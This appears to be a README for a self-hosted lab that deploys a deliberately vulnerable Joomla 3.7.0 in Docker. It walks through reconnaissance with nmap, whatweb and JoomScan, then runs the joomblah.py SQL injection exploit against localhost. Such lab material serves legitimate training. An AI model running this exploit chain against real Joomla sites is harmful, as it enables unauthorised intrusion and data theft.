# Joomla 3.7.0 Vulnarable
Docker and docker compose install
```
apt install docker.io docker-compose -y
```
Start docker service
```
systemctl start docker
```
Download docker-compose file
```
wget https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/docker-compose.yml
```
Download and execute docker
```
docker-compose up
```
Service identify
```
netstat -nltp
```
```
nmap -sV -p8080 127.0.0.1 --script=http*
```
Technology identify
```
whatweb -v http://127.0.0.1:8080
```
JoomScan Download
```
git clone https://github.com/rezasp/joomscan.git
```
Directory access
```
cd joomscan
```
JoomScan execute
```
perl joomscan.pl
```
Scanning WebApp
```
perl joomscan.pl -u http://127.0.0.1:8080
```
Download JoomBlah
```
https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/joomblah.py
```
Execute JoomBlah
```
python2 joomblah.py
```
Target Exploiting
```
python2 joomblah.py http://127.0.0.1:8080
```
